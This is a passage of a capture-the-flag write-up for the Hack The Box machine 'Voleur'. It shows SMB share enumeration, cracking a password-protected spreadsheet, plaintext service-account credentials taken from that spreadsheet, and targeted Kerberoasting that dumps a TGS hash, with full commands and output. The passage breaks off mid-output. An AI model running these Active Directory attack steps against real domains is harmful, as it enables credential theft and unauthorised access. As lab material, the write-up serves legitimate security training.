<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ntpdate voleur.htb <span style="color:#f92672">&amp;&amp;</span> nxc smb 10.129.196.199 -u ryan.naylor -p <span style="color:#e6db74">&#39;HollowOct31Nyt&#39;</span> -d voleur.htb -k --shares
</span></span><span style="display:flex;"><span>2025-07-06 06:25:00.534568 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> -0.001658 +/- 0.013549 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>  x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:voleur.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>NTLM:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> voleur.htb<span style="color:#ae81ff">\r</span>yan.naylor:HollowOct31Nyt 
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               Share           Permissions     Remark
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               -----           -----------     ------
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               ADMIN$                          Remote Admin
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               C$                              Default share
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               Finance                         
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               HR                              
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               IPC$            READ            Remote IPC
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               IT              READ            
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               NETLOGON        READ            Logon server share 
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               SYSVOL          READ            Logon server share 
</span></span></code></pre></td></tr></table>
</div>
</div><p>The successful authentication using Kerberos (<code>-k</code> flag) confirmed that the domain controller required Kerberos authentication for SMB access. This is a security best practice that prevents pass-the-hash attacks and ensures all authentication is properly logged and audited.</p>
<p><strong>Accessible Shares:</strong></p>
<ul>
<li><strong>IT (READ)</strong> - Departmental share likely containing technical documentation</li>
<li><strong>NETLOGON (READ)</strong> - Standard domain share for logon scripts</li>
<li><strong>SYSVOL (READ)</strong> - Standard domain share for policies and scripts</li>
</ul>
<p>The IT share was particularly interesting as it suggested access to technical documentation and potentially sensitive information related to system administration.</p>
<p><strong>2.2 IT Share Exploration</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ntpdate voleur.htb <span style="color:#f92672">&amp;&amp;</span> impacket-smbclient -k -no-pass voleur.htb/ryan.naylor@dc.voleur.htb -target-ip 10.129.196.199
</span></span><span style="display:flex;"><span>2025-07-06 06:53:36.978238 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> +28799.386157 +/- 0.162155 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span style="display:flex;"><span>CLOCK: time stepped by 28799.386157
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Type help <span style="color:#66d9ef">for</span> list of commands
</span></span><span style="display:flex;"><span><span style="color:#75715e"># shares</span>
</span></span><span style="display:flex;"><span>ADMIN$
</span></span><span style="display:flex;"><span>C$
</span></span><span style="display:flex;"><span>Finance
</span></span><span style="display:flex;"><span>HR
</span></span><span style="display:flex;"><span>IPC$
</span></span><span style="display:flex;"><span>IT
</span></span><span style="display:flex;"><span>NETLOGON
</span></span><span style="display:flex;"><span>SYSVOL
</span></span><span style="display:flex;"><span><span style="color:#75715e"># use IT</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls</span>
</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 10:10:01 <span style="color:#ae81ff">2025</span> .
</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#ae81ff">0</span>  Mon Jun <span style="color:#ae81ff">30</span> 23:08:33 <span style="color:#ae81ff">2025</span> ..
</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 10:40:17 <span style="color:#ae81ff">2025</span> First-Line Support
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cd First-Line Support</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls</span>
</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 10:40:17 <span style="color:#ae81ff">2025</span> .
</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 10:10:01 <span style="color:#ae81ff">2025</span> ..
</span></span><span style="display:flex;"><span>-rw-rw-rw-      <span style="color:#ae81ff">16896</span>  Fri May <span style="color:#ae81ff">30</span> 00:23:36 <span style="color:#ae81ff">2025</span> Access_Review.xlsx
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get Access_Review.xlsx</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># exit</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The exploration of the IT share revealed a structured organization with folders corresponding to different support tiers. The &ldquo;First-Line Support&rdquo; folder contained an Excel file named &ldquo;Access_Review.xlsx&rdquo;, which suggested periodic access reviews - a common security practice that often contains sensitive credential information.</p>
<p><strong>2.4 Excel File Analysis</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span> 
</span></span><span style="display:flex;"><span>└─# office2john Access_Review.xlsx &gt; excel_hash.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span> 
</span></span><span style="display:flex;"><span>└─# john --wordlist<span style="color:#f92672">=</span>/home/hexhunter404/Downloads/rockyou.txt excel_hash.txt 
</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8 Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>Office, 2007/2010/2013 <span style="color:#f92672">[</span>SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES<span style="color:#f92672">])</span> Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>MS Office version<span style="color:#f92672">)</span> is <span style="color:#ae81ff">2013</span> <span style="color:#66d9ef">for</span> all loaded hashes 
</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">100000</span> <span style="color:#66d9ef">for</span> all loaded hashes 
</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status 
</span></span><span style="display:flex;"><span>football1 <span style="color:#f92672">(</span>Access_Review.xlsx<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>1g 0:00:00:06 DONE <span style="color:#f92672">(</span>2025-07-05 23:05<span style="color:#f92672">)</span> 0.1459g/s 114.4p/s 114.4c/s 114.4C/s football1..lolita Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably 
</span></span><span style="display:flex;"><span>Session completed.
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Password:</strong> football1</p>
<p>The Excel file was password-protected with a weak password (&ldquo;football1&rdquo;), demonstrating poor security practices. This type of weak password protection is common in corporate environments where users prioritize convenience over security.</p>
<p><strong>Critical Information Discovered:</strong></p>
<ul>
<li><strong>svc_ldap:</strong> M1XyC9pW7qT5Vn (LDAP Services)</li>
<li><strong>svc_iis:</strong> N5pXvW1VqM7CZ8 (IIS Administration)</li>
<li><strong>todd.wolfe:</strong> NightT1meP1dg3on14 (Account to be deleted)</li>
<li><strong>ryan.naylor:</strong> &ldquo;Has Kerberos Pre-Auth disabled temporarily&rdquo;</li>
</ul>
<p><img src="/images/writeups/htb/voleur/image.png" alt="Excel sheet content"></p>
<p>The access review spreadsheet contained a treasure trove of sensitive information, including plaintext passwords for multiple service accounts. The note about todd.wolfe&rsquo;s account being scheduled for deletion was particularly significant, as deleted accounts often retain valuable data. The notation about ryan.naylor having Kerberos Pre-Authentication disabled temporarily indicated a potential AS-REP roasting vulnerability.</p>
<hr>
<h2 id="phase-3-privilege-escalation"><strong>Phase 3: Privilege Escalation</strong><a href="#phase-3-privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p><strong>3.1 Service Account Authentication</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Test svc_ldap credentials</span>
</span></span><span style="display:flex;"><span>nxc smb 10.129.196.199 -u svc_ldap -p <span style="color:#e6db74">&#39;M1XyC9pW7qT5Vn&#39;</span> -d voleur.htb -k
</span></span></code></pre></td></tr></table>
</div>
</div><p>The successful authentication with the svc_ldap service account marked a significant escalation in privileges. Service accounts typically have elevated permissions within Active Directory environments, as they need to perform various automated tasks and services.</p>
<p><strong>3.2 BloodHound Analysis</strong></p>
<p><strong>Key Discovery:</strong> svc_ldap has WriteSPN permission on svc_winrm</p>
<p><img src="/images/writeups/htb/voleur/writespn.png" alt="WriteSPN"></p>
<p>BloodHound analysis revealed that svc_ldap possessed WriteSPN (Write Service Principal Name) permissions on the svc_winrm account. This permission allows modification of Service Principal Names, which can be exploited to perform targeted Kerberoasting attacks. This relationship represents a classic example of how complex Active Directory permissions can create unintended privilege escalation paths.</p>
<p><strong>3.3 Targeted Kerberoasting (cf.</strong> <a href="https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting">https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting</a>)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/Machines/Season8/Voleur/targetedKerberoast<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ntpdate voleur.htb <span style="color:#f92672">&amp;&amp;</span> ./targetedKerberoast.py -v -d voleur.htb -u svc_ldap -p <span style="color:#e6db74">&#39;M1XyC9pW7qT5Vn&#39;</span> --dc-ip 10.129.196.199 --dc-host dc.voleur.htb -k
</span></span><span style="display:flex;"><span>2025-07-06 07:46:00.880780 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> +28801.753306 +/- 0.009549 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span style="display:flex;"><span>CLOCK: time stepped by 28801.753306
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting kerberoast attacks
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Fetching usernames from Active Directory with LDAP
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> SPN added successfully <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>lacey.miller<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Printing hash <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>lacey.miller<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$9c71ef22710b4dbcd38d56204182f6d2$8631661121f089f3c4c2aea4867a92b124e862894f2c44d9274a20cb2dc216090b9abf4b2610d92db623e8f3594b7ccdfcf66efb2d7fd868451b1b7637167004cbe7fc2da9c1179dd0ca44450df6397164fb3b0ecd4ecc4bf9c1e9113f1b79de3b93a74172ce2e32103175de5830dbc90e2af9e9fa47c624e2bf69a7c61eccad388a8d4c6dfbf37115ca34974e8229fa4d71dcb9ecc0c80db4f9a834ead0907a3542740dec01c45f0da40b246a56813c304dc19e05f32de23e852c7b5fb3668c2c39f921c0a6075a7a4a43295ddbbff4854b1d9135877a718e1d6617b308359fe4ef4280d3580975f2ee4b1f2b1f3049ba73fb8c4e897e700075a8e96dfe603eb9f7dd251f69a9ad7fbe0829ffdbde587ca9cac8c902a895e093e5488796fff1797186d78b5c46ea74882045a881a8d69d2797de0d90b1780b8cb570fe3b7af418dc2fe58cd2f899623f7ee6f4f465578eb87e3b1242550125cda53a5f532f07aba674a83a420c283cdab8ca7a3e82c5d21b4d5ee1599796e88e872913337a4024eee1796f9c3e0c87c779d61eb0f169e8337fec6b38ea491b6d9e51c5f7f7f99f93795aad3e40976972599f29626bf9d3df33a0349d6dc9487bb68ba4b0340900addb6f6eb492b27c2db1285fb045922c2fc9bf2d8226c77034b04ae1951946fae3d5e2844d8f96f7affefa21b28d900f74d8e223c6dcc51cdd9bff150f94e271fa1b0bfb9d845cb37cd71ae8b0e1cc3dcacf0e89809d211146d94873527d6b6b99b5e12bfebc62839387a973800096a8886d5e12352e678655503a0e1e792cfbc5f139120dd59a10d7675d9a48eccdaa76322723cfbe7dcecd8165890ad17bad4219904df285a45dcfed917fedca4031a84580cd8da72056b9d43fb63563ebe4c9e9d79bb234f96b4230648098a6a0159aa8348f14e678a6a4301f93b0c69e77beb9d6c6a01dcdf02b6b75ba55cbb8c4fdc6717c865fcb3cbdd98b938cd52e322f4eb78a549d44f038ff73a09c82a2d680a2a2eb1a07ee2d974484072e61a5bf921356b30d999b5364b6e3881b4d4a6ab7aadaea0be836006c30f2ea77084d8b862d540227f3bc32a6a3da11ddbd2fb4f37105ac5c0ae33293a7706bdb759fdf01ff086e4262f695e86fd3c8597686e2828474400669df3a94e2dc5afa268972bc81ac7d680736d8e60f9e23757a2e12df46f3cd3a689000aca324ad0b97c2cd41a530922ecc4ff68e339ea5fb622694aec219c99ae2f4bc1c3dde7e725f5fb081d8c844fdb8da7bf9219dab333781f61d8dcb805c7483ef3eb30d0fc91c4d5d2962f907377f310d958ada60c8791ec4891eb194576658ccf03b42dc8422f2ac09e34965304fbabf7c6069f236c1ee8c14468d5ee673f6ec0a7272e7f48310e720e95582440b61202367b20c4da0ca32da9f31740f76e0eb4bd0d412738f7f
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> SPN removed successfully <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>lacey.miller<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> SPN added successfully <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>svc_winrm<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Printing hash <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>svc_winrm<span style="color:#f92672">)</span>
